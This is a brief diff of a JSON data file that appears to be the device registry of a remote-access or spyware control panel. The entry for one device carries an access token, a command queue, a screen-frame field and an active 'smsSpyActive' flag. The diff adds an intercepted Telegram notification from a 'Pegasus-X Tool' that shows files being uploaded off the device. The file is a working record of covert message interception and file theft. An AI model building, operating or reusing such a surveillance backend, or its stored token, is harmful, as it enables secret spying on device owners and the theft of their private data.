@@ -1515,7 +1515,7 @@
     "deviceName": "HP-ZAL7SEX-F5FF",
     "ownerUsername": "Zal7Sex",
     "token": "d65607314eb3c6cfb4de3bf10719f025",
-    "lastSeen": 1776536809760,
+    "lastSeen": 1776536812782,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-18T18:19:58.714Z",
@@ -1531,6 +1531,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Pegasus-X Tool",
+        "content": "⎙ Uploading...\n\n▢ Progress\n└──\n ├── [████████░░░░░░░] 52%\n └── files : 24/46",
+        "time": "19/04 01:26",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776536813532
+      },
       {
         "appName": "Telegram",
         "sender": "Pegasus-X Tool",
